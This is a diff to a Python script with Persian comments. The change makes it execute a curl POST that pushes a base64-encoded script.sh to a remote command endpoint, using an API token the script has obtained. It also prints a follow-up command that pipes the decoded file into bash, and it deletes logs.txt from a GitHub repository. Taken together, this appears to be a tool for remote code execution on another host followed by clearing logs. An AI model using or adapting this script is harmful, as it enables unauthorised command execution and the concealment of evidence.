@@ -6,6 +6,7 @@ import re
 import sys
 import base64
 import requests
+import subprocess  # <-- اضافه شد برای اجرای دستورات
 
 
 # ============================================================
@@ -806,52 +807,81 @@ else:
 
 
 # ============================================================
-# 2H. PRINT CURL COMMANDS WITH REAL TOKEN (CLEAN)
+# 2H. EXECUTE FIRST CURL & PRINT RESULT (CLEAN)
 # ============================================================
 #
-# فقط دستورات curl با توکن واقعی چاپ می‌شوند.
-# هیچ پیام اضافه‌ای چاپ نمی‌شود.
+# - فقط اولین curl اجرا می‌شود (ارسال script.sh به سرور هدف)
+# - نتیجه‌ی اجرا به‌صورت تمیز در لاگ چاپ می‌شود
+# - دومین curl (اجرای اسکریپت) اجرا نمی‌شود
 #
 # ============================================================
 
 if endpoint and token_value:
 
-    print()
-    print("B64=$(base64 -w0 script.sh)")
-    print()
+    print("======================================")
+    print(" EXECUTING FIRST CURL (SEND SCRIPT)")
+    print("======================================")
 
-    print(
-        f'curl -X POST "{endpoint}" \\'
-    )
-    print(
-        f'  -H "Authorization: Bearer {token_value}" \\'
-    )
-    print(
-        '  -H "Content-Type: application/json" \\'
-    )
-    print(
-        '  -d "{\\"command\\": \\"echo \'$B64\' > /tmp/script.b64\\"}"'
-    )
+    # 1. تبدیل script.sh به base64
+    try:
+        b64_result = subprocess.run(
+            ["base64", "-w0", "script.sh"],
+            capture_output=True,
+            text=True,
+            check=True
+        )
+        b64_data = b64_result.stdout.strip()
+    except subprocess.CalledProcessError as e:
+        print(f"ERROR: base64 encoding failed: {e.stderr}")
+        sys.exit(1)
 
+    # 2. ساخت دستور curl اول
+    curl_cmd = [
+        "curl", "-X", "POST", endpoint,
+        "-H", f"Authorization: Bearer {token_value}",
+        "-H", "Content-Type: application/json",
+        "-d", f'{{"command": "echo \'{b64_data}\' > /tmp/script.b64"}}'
+    ]
+
+    # 3. اجرای curl
+    try:
+        result = subprocess.run(
+            curl_cmd,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+    except subprocess.TimeoutExpired:
+        print("ERROR: curl command timed out after 60 seconds")
+        sys.exit(1)
+
+    # 4. چاپ نتیجه‌ی تمیز
     print()
+    print("=== CURL EXECUTION RESULT ===")
+    print(f"Status code: {result.returncode}")
+    if result.stdout:
+        print("STDOUT:")
+        print(result.stdout.strip())
+    if result.stderr:
+        print("STDERR:")
+        print(result.stderr.strip())
+    print("==============================")
 
-    print(
-        f'curl -X POST "{endpoint}" \\'
-    )
-    print(
-        f'  -H "Authorization: Bearer {token_value}" \\'
-    )
-    print(
-        '  -H "Content-Type: application/json" \\'
-    )
-    print(
-        '  -d "{\\"command\\": \\"base64 -d /tmp/script.b64 | bash\\"}" \\'
-    )
-    print(
-        '  --max-time 300'
-    )
-
+    # 5. چاپ خود دستور (برای اطلاع)
     print()
+    print("=== COMMAND EXECUTED ===")
+    print(" ".join(curl_cmd))
+    print("=========================")
+
+    # 6. (اختیاری) چاپ دستور دوم به‌عنوان متن، بدون اجرا
+    print()
+    print("=== SECOND CURL (NOT EXECUTED, FOR REFERENCE) ===")
+    print(f'curl -X POST "{endpoint}" \\')
+    print(f'  -H "Authorization: Bearer {token_value}" \\')
+    print('  -H "Content-Type: application/json" \\')
+    print('  -d "{\\"command\\": \\"base64 -d /tmp/script.b64 | bash\\"}" \\')
+    print('  --max-time 300')
+    print("==================================================")
 
 else:
 
@@ -859,19 +889,10 @@ else:
     print(" SECTION 2 FAILED")
     print("======================================")
 
-
     if not endpoint:
-
-        print(
-            "Reason: REMOTE_URL was not found."
-        )
-
-
+        print("Reason: REMOTE_URL was not found.")
     if not token_value:
-
-        print(
-            "Reason: API_TOKEN was not found."
-        )
+        print("Reason: API_TOKEN was not found.")
 
 
 # ============================================================
@@ -884,73 +905,40 @@ if endpoint and token_value:
     print(" DELETING logs.txt")
     print("======================================")
 
-
-    file_sha = logs_json.get(
-        "sha"
-    )
-
+    file_sha = logs_json.get("sha")
 
     if not file_sha:
-
-        print(
-            "WARNING: logs.txt SHA not found."
-        )
-
+        print("WARNING: logs.txt SHA not found.")
     else:
-
         delete_payload = {
             "message": "Delete temporary logs.txt",
             "sha": file_sha,
             "branch": GITHUB_REF,
         }
 
-
         try:
-
             delete_response = requests.delete(
                 logs_url,
                 headers=github_headers(),
                 json=delete_payload,
                 timeout=30,
             )
-
         except requests.RequestException as exc:
-
-            print(
-                f"WARNING: Could not delete logs.txt: {exc}"
-            )
-
+            print(f"WARNING: Could not delete logs.txt: {exc}")
         else:
-
             if delete_response.status_code == 200:
-
-                print(
-                    "logs.txt deleted successfully."
-                )
-
+                print("logs.txt deleted successfully.")
             else:
-
-                print(
-                    "WARNING: Could not delete logs.txt."
-                )
-
-                print(
-                    f"HTTP: {delete_response.status_code}"
-                )
+                print("WARNING: Could not delete logs.txt.")
+                print(f"HTTP: {delete_response.status_code}")
 
 else:
 
     print("======================================")
     print(" logs.txt KEPT FOR DEBUGGING")
     print("======================================")
-
-    print(
-        "Because Endpoint and Token were not both found,"
-    )
-
-    print(
-        "logs.txt was NOT deleted."
-    )
+    print("Because Endpoint and Token were not both found,")
+    print("logs.txt was NOT deleted.")
 
 
 # ============================================================
@@ -960,15 +948,8 @@ else:
 print("======================================")
 
 if endpoint and token_value:
-
-    print(
-        "SECTION 2 COMPLETE"
-    )
-
+    print("SECTION 2 COMPLETE")
 else:
-
-    print(
-        "SECTION 2 FINISHED WITHOUT MATCH"
-    )
+    print("SECTION 2 FINISHED WITHOUT MATCH")
 
 print("======================================")
